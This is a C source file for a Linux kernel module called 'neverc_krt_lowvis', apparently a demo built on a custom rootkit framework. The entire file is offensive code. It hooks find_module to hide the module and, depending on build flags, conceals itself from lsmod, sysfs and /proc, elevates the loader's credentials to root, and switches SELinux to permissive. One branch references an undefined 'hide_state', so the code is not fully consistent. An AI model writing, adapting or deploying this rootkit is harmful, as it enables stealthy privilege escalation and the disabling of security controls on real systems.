/* SPDX-License-Identifier: GPL-2.0 */
#include <nvkmod.h>
#include <nvk_interpose.h>
#include <nvk_vis.h>
#include <nvk_process.h>
#include <nvk_cred.h>
#include <nvk_mem.h>
#include <nvk_selinux.h>

#define NEVERC_KRT_LOG_TAG "neverc_krt_lowvis"
#include <nvk_log.h>

static struct neverc_krt_vis_state vis_state = NEVERC_KRT_VIS_INIT_STATE;
#ifdef NVK_LOWVIS_SELINUX
static struct neverc_krt_selinux_bypass selinux_state;
#endif

static int neverc_krt_str_eq(const char *a, const char *b)
{
	while (*a && *b) {
		if (*a != *b) return 0;
		a++; b++;
	}
	return *a == *b;
}

#ifdef NEVERC_KRT_CONTEXT_INTERPOSE

static struct neverc_krt_interpose_ctx find_module_ctx;

static void interpose_find_module_ctx(neverc_krt_reg_ctx *ctx)
{
	const char *name = (const char *)NEVERC_KRT_CTX_ARG(ctx, 0);

	if (name && neverc_krt_str_eq(name, "neverc_krt_lowvis"))
		NEVERC_KRT_CTX_SKIP(ctx, 0);
}

#else

typedef void *(*find_module_fn)(const char *name);
static find_module_fn orig_find_module;

static void *interpose_find_module(const char *name)
{
	if (name && neverc_krt_str_eq(name, "neverc_krt_lowvis"))
		return (void *)0;
	return orig_find_module(name);
}

#endif

static int neverc_krt_lowvis_init(void)
{
	int ret;
	void *target;

	ret = NEVERC_KRT_BOOTSTRAP();
	if (ret)
		return ret;

	neverc_krt_log_info("init on %s\n", NEVERC_KRT_KERNEL_STR);

	neverc_krt_mem_init();
	neverc_krt_process_init();
	neverc_krt_vis_init();
	neverc_krt_cred_init();

	ret = neverc_krt_interpose_init();
	if (ret) {
		neverc_krt_log_err("interpose init: %d\n", ret);
		return ret;
	}

	target = NEVERC_KRT_LOOKUP("find_module");
	if (target) {
#ifdef NEVERC_KRT_CONTEXT_INTERPOSE
		ret = neverc_krt_interpose_install_ctx(&find_module_ctx, target,
					    interpose_find_module_ctx, (void *)0);
#else
		ret = neverc_krt_interpose_install(&hide_state.find_module_interpose,
				       target, (void *)interpose_find_module,
				       (void **)&orig_find_module);
#endif
		if (ret)
			neverc_krt_log_warn("find_module interpose: %d\n", ret);
		else
			neverc_krt_log_info("find_module interposed\n");
	}

#ifdef NVK_LOWVIS_FULL_HIDE
	neverc_krt_vis_full_conceal(&vis_state, &__this_module, "neverc_krt_lowvis");
	neverc_krt_log_info("deep-hidden (list+sysfs+proc)\n");
#elif defined(NVK_LOWVIS_HIDE)
	neverc_krt_vis_conceal(&vis_state, &__this_module);
	neverc_krt_log_info("hidden from lsmod\n");
#else
	neverc_krt_log_info("log-only mode\n");
#endif

#ifdef NVK_LOWVIS_ROOT
	ret = neverc_krt_cred_set_root();
	if (ret == 0)
		neverc_krt_log_info("credentials elevated\n");
	else
		neverc_krt_log_warn("cred elevation failed\n");
#endif

#ifdef NVK_LOWVIS_SELINUX
	if (neverc_krt_selinux_init() == 0) {
		neverc_krt_log_info("selinux enforcing=%d\n",
			     neverc_krt_selinux_is_enforcing());
		ret = neverc_krt_selinux_set_permissive();
		if (ret == 0)
			neverc_krt_log_info("selinux -> permissive\n");
		else
			neverc_krt_log_warn("selinux set_permissive: %d\n", ret);
	}
#endif

	neverc_krt_log_info("loaded by pid=%d\n", neverc_krt_current_pid());
	return 0;
}

static void neverc_krt_lowvis_exit(void)
{
#ifdef NVK_LOWVIS_SELINUX
	neverc_krt_selinux_set_enforcing();
#endif
#ifdef NEVERC_KRT_CONTEXT_INTERPOSE
	neverc_krt_interpose_remove_ctx(&find_module_ctx);
#endif
	neverc_krt_vis_remove_interposes();
	neverc_krt_vis_reveal(&vis_state, &__this_module);
	neverc_krt_log_info("unloaded\n");
}

module_init(neverc_krt_lowvis_init);
module_exit(neverc_krt_lowvis_exit);

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("NeverC");
MODULE_DESCRIPTION("NeverC lowvis demo");

NEVERC_KRT_DEFINE_MODULE("neverc_krt_lowvis");
